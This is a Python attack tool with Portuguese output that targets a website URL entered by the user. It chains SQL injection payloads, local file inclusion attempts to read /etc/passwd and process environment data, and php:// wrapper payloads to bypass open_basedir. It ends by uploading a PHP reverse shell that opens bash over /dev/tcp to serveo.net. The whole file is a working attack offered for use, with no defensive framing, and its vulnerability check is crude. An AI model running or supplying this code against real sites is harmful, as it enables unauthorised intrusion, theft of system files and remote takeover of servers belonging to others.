import requests
from colorama import Fore, Style

def verificar_vulnerabilidade(url, headers=None):
    payloads = [
        "' OR '1'='1", "' OR '1'='1' --", '" OR "1"="1" --',
        "') OR ('1'='1", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT 1,2,3 --"
    ]
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(url + payload, headers=headers)
            if "syntax" not in response.text.lower() and response.status_code == 200:
                print(f"{Fore.GREEN}[+] Vulnerabilidade de SQL Injection detectada com payload: {payload}{Style.RESET_ALL}")
                vulnerable = True
                break
        except Exception as e:
            print(f"{Fore.RED}[-] Erro ao verificar com o payload {payload}: {e}{Style.RESET_ALL}")

    if not vulnerable:
        print(f"{Fore.YELLOW}[-] Nenhuma vulnerabilidade detectada.{Style.RESET_ALL}")
    return vulnerable


def explorar_lfi(url, headers=None):
    print(f"{Fore.CYAN}[+] Tentando explorar LFI...{Style.RESET_ALL}")
    lfi_payloads = [
        "../../../../../../../etc/passwd",
        "../../../../../../../../proc/self/environ",
        "../etc/passwd",
        "../../../../../../../var/www/html/index.php"
    ]
    for payload in lfi_payloads:
        try:
            response = requests.get(f"{url}?file={payload}", headers=headers)
            if "root:x:" in response.text or "<?php" in response.text:
                print(f"{Fore.GREEN}[+] LFI detectado com payload: {payload}{Style.RESET_ALL}")
                print(response.text[:500])
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] Erro ao testar LFI com {payload}: {e}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[-] Nenhum LFI encontrado.{Style.RESET_ALL}")
    return False


def testar_bypass_open_basedir(url, headers=None):
    print(f"{Fore.CYAN}[+] Testando bypass do open_basedir...{Style.RESET_ALL}")
    bypass_payloads = [
        "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
        "php://input", "php://memory", "php://fd", "php://temp"
    ]
    for payload in bypass_payloads:
        try:
            response = requests.get(f"{url}?file={payload}", headers=headers)
            if response.status_code == 200 and ("root:x:" in response.text or "<?php" in response.text):
                print(f"{Fore.GREEN}[+] Bypass open_basedir detectado com payload: {payload}{Style.RESET_ALL}")
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] Erro ao testar bypass com {payload}: {e}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[-] Nenhum bypass de open_basedir encontrado.{Style.RESET_ALL}")
    return False


def gerar_shell_php(ip, porta):
    print(f"[+] Gerando shell PHP com IP: {ip} e porta: {porta}")
    return f"""<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{porta} 0>&1'");
    ?>"""


def testar_upload(url, headers=None):
    print(f"{Fore.CYAN}[+] Testando permissão de upload de arquivos PHP...{Style.RESET_ALL}")
    porta = input("[+] Qual porta deseja usar para a reverse shell? (exemplo: 4444): ")
    ip = "serveo.net"
    try:
        upload_url = url + "/upload.php"
        shell_php = gerar_shell_php(ip, porta)
        files = {"file": ("shell.php", shell_php)}
        response = requests.post(upload_url, files=files, headers=headers)
        if response.status_code == 200 or "upload" in response.text.lower():
            print(f"{Fore.GREEN}[+] Upload permitido! Shell PHP enviada com sucesso!{Style.RESET_ALL}")
            print(f"[+] Acesse: {upload_url}/shell.php?cmd=id")
            return True
    except Exception as e:
        print(f"{Fore.RED}[-] Erro ao testar upload: {e}{Style.RESET_ALL}")
    return False


def main():
    print(f"{Fore.BLUE}=== Ferramenta de SQL Injection para Shell Remota ==={Style.RESET_ALL}")
    url = input("Digite a URL do site a ser verificado: ")
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*'
    }

    if verificar_vulnerabilidade(url, headers=headers):
        if not explorar_lfi(url, headers=headers):
            if not testar_bypass_open_basedir(url, headers=headers):
                if testar_upload(url, headers=headers):
                    print(f"{Fore.GREEN}[+] Shell PHP carregada com sucesso!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Não foi possível carregar a shell PHP.{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[-] Nenhuma vulnerabilidade SQL Injection detectada.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
